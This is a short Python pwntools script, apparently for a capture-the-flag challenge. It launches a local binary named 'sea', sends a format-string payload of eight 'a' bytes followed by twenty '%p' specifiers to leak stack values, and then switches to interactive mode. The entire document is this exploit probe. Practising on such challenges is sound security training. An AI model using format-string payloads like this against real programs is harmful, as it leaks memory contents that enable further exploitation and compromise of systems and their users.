from pwn import *

io = process("./sea")

payload = b"aaaaaaaa" + b" %p" * 20

io.send(payload)

io.interactive()
